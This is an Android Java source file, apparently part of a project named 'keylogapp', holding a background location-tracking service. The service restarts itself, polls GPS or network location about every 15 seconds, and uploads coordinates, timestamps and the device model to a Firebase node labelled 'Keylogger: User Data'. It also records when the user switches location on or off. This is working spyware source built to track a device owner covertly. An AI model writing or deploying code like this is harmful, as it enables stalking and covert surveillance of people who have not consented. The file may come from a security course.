package com.maemresen.infsec.keylogapp;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.maemresen.infsec.keylogapp.util.DateTimeHelper;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class LocationService extends Service implements LocationListener {
    
    private static final String TAG = LocationService.class.getSimpleName();
    
    private LocationManager locationManager;
    private final long MIN_TIME_BETWEEN_UPDATES = 15 * 1000;
    private final float MIN_DISTANCE_CHANGE_FOR_UPDATES = 0.1f;
    private String ownerName;
    private String databaseName;
    private DatabaseReference locationRef;
    private SimpleDateFormat dateFormatWithTimeSeconds;
    private Location lastLocation;
    private long lastLocationUpdateTime = 0;
    String databaseNameWithTime, databaseNameWithTimeAndSeconds;
    
    @Override
    public void onCreate() {
        super.onCreate();
        locationManager = (LocationManager) getSystemService( Context.LOCATION_SERVICE );
        
        ownerName = Build.MODEL;
        
        Date now = new Date();
        dateFormatWithTimeSeconds = new SimpleDateFormat( "dd-MM-yyyy, HH:mm:ss", Locale.getDefault() );
        databaseName = new SimpleDateFormat( "dd-MM-yyyy", Locale.getDefault() ).format( now );
        
        locationRef = FirebaseDatabase.getInstance().getReference()
                .child( "Keylogger: User Data" )
                .child( ownerName )
                .child( databaseName )
                .child( "Location" );
        
        startLocationUpdates();
    }
    
    @Override
    public int onStartCommand( Intent intent, int flags, int startId ) {
    
        updateDatabaseNameAndTime();
        // Initialize LocationManager and start location updates
        locationManager = (LocationManager) getSystemService( Context.LOCATION_SERVICE );
        startLocationUpdates();
        
        return START_STICKY;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        stopLocationUpdates();
    }
    
    @Nullable
    @Override
    public IBinder onBind( Intent intent ) {
        return null;
    }
    
    public void updateDatabaseNameAndTime() {
        
        Date now = DateTimeHelper.getCurrentDay();
        
        SimpleDateFormat dateFormatWithTime = new SimpleDateFormat( "dd-MM-yyyy, HH:mm",
                Locale.getDefault() );
        databaseNameWithTime = dateFormatWithTime.format( now );
        
        SimpleDateFormat dateFormatWithTimeWithSeconds = new SimpleDateFormat( "dd-MM-yyyy, " +
                "HH:mm:ss",
                Locale.getDefault() );
        databaseNameWithTimeAndSeconds = dateFormatWithTimeWithSeconds.format( now );
    }
    
    private void startLocationUpdates() {
        // Check for location provider availability and request location updates
        if (locationManager != null) {
            if (locationManager.isProviderEnabled( LocationManager.GPS_PROVIDER )) {
                if (ActivityCompat.checkSelfPermission( this,
                        android.Manifest.permission.ACCESS_FINE_LOCATION ) == PackageManager.PERMISSION_GRANTED
                        && ActivityCompat.checkSelfPermission( this,
                        android.Manifest.permission.ACCESS_COARSE_LOCATION ) == PackageManager.PERMISSION_GRANTED) {
                    locationManager.requestLocationUpdates( LocationManager.GPS_PROVIDER,
                            MIN_TIME_BETWEEN_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, this );
                    Location lastKnownLocation = locationManager.getLastKnownLocation( LocationManager.GPS_PROVIDER );
                    if (lastKnownLocation != null) {
                        double latitude = lastKnownLocation.getLatitude();
                        double longitude = lastKnownLocation.getLongitude();
                        saveLocationToFirebase( latitude, longitude );
                    }
                } else {
                    saveLocationErrorToFirebase( "Unable to Locate the Device Location using GPS" );
                }
            } else if (locationManager.isProviderEnabled( LocationManager.NETWORK_PROVIDER )) {
                if (ActivityCompat.checkSelfPermission( this,
                        android.Manifest.permission.ACCESS_FINE_LOCATION ) == PackageManager.PERMISSION_GRANTED
                        && ActivityCompat.checkSelfPermission( this,
                        android.Manifest.permission.ACCESS_COARSE_LOCATION ) == PackageManager.PERMISSION_GRANTED) {
                    locationManager.requestLocationUpdates( LocationManager.NETWORK_PROVIDER,
                            MIN_TIME_BETWEEN_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, this );
                } else {
                    saveLocationErrorToFirebase( "Unable to Locate the Device Location using NETWORK" );
                }
            }
        }
    }
    
    
    private void stopLocationUpdates() {
        if (locationManager != null) {
            locationManager.removeUpdates( this );
        }
    }
    
    @Override
    public void onLocationChanged( Location location ) {
        updateDatabaseNameAndTime();
        long currentTime = System.currentTimeMillis();
        if (currentTime - lastLocationUpdateTime >= MIN_TIME_BETWEEN_UPDATES || location.distanceTo( lastLocation ) >= MIN_DISTANCE_CHANGE_FOR_UPDATES) {
            saveLocationToFirebase( location.getLatitude(), location.getLongitude() );
            lastLocationUpdateTime = currentTime;
            lastLocation = location;
        }
    }
    
    @Override
    public void onStatusChanged( String provider, int status, Bundle extras ) {
    }
    
    @Override
    public void onProviderEnabled( String provider ) {
        if (ActivityCompat.checkSelfPermission( this,
                android.Manifest.permission.ACCESS_FINE_LOCATION ) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission( this, android.Manifest.permission.ACCESS_COARSE_LOCATION ) == PackageManager.PERMISSION_GRANTED) {
            saveLocationErrorToFirebase( "The Device Location Has Been Enabled By The User" );
            return;
        }
        Location lastKnownLocation = locationManager.getLastKnownLocation( LocationManager.GPS_PROVIDER );
        if (lastKnownLocation != null) {
            double latitude = lastKnownLocation.getLatitude();
            double longitude = lastKnownLocation.getLongitude();
            saveLocationToFirebase( latitude, longitude );
        }
    }
    
    @Override
    public void onProviderDisabled( String provider ) {
        updateDatabaseNameAndTime();
        saveLocationErrorToFirebase( "The Device Location Has Been Disabled By The User" );
    }
    
    private void saveLocationToFirebase( double latitude, double longitude ) {
        updateDatabaseNameAndTime();
        DatabaseReference locationRefrence = FirebaseDatabase.getInstance().getReference( "Keylogger:" +
                        " User Data" )
                .child( ownerName )
                .child( databaseName )
                .child( "Location" );
        
        String locationText = String.format( Locale.getDefault(), "LOCATION: %.6f lat, %.6f " +
                "lon\nDate/Time: %s", latitude, longitude, databaseNameWithTimeAndSeconds );
        locationRefrence.push().setValue( locationText );
        
    }
    
    private void saveLocationErrorToFirebase( String errMsg ) {
        updateDatabaseNameAndTime();
        DatabaseReference locationRefrence = FirebaseDatabase.getInstance().getReference( "Keylogger:" +
                        " User Data" )
                .child( ownerName )
                .child( databaseName )
                .child( "Location" );
        
        String locationText = String.format( Locale.getDefault(), "LOCATION: %s \nDate/Time: %s",
                errMsg, databaseNameWithTimeAndSeconds );
        locationRefrence.push().setValue( locationText );
    }
}